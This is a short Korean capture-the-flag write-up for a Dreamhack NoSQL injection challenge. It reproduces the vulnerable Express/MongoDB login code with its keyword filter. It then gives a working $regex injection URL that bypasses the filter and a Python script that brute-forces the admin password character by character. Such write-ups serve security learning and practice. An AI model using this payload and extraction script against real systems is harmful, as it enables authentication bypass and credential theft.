## 코드

```js
app.get('/login', function(req, res) {
    if(filter(req.query)){ // filter 함수 실행
        res.send('filter');
        return;
    }
    const {uid, upw} = req.query; 
    db.collection('user').findOne({ // db에서 uid, upw로 검색
        'uid': uid,
        'upw': upw,
    }, function(err, result){
        if (err){ 
            res.send('err');
        }else if(result){ 
            res.send(result['uid']); 
        }else{
            res.send('undefined'); 
        }
    })
});

// flag is in db, {'uid': 'admin', 'upw': 'DH{32alphanumeric}'}
const BAN = ['admin', 'dh', 'admi'];
filter = function(data){
    const dump = JSON.stringify(data).toLowerCase();
    var flag = false;
    BAN.forEach(function(word){
        if(dump.indexOf(word)!=-1) flag = true;
    });
    return flag;
}
```

## 풀이

일단 type 검사 없기 때문에 object 넣을 수 있어서 sql injection 가능

$regex 활용해서 데이터 검색 가능
필터링은 정규표현식에서 임의 문자를 의미하는 .를 활용해 우회 가능

```bash
http://host1.dreamhack.games:13698/login?uid[$regex]=ad.in&upw[$regex]=D.{*
> admin
```

이제 이걸 기반으로 password를 한글자씩 알아내면 됨

```python
import requests, string
HOST = 'http://host2.dreamhack.games:23863'
ALPHANUMERIC = string.digits + string.ascii_letters
SUCCESS = 'admin'
flag = ''
for i in range(32):
    for ch in ALPHANUMERIC:
        response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}')
        if response.text == SUCCESS:
            flag += ch
            break
    print(f'FLAG: DH{{{flag}}}')
```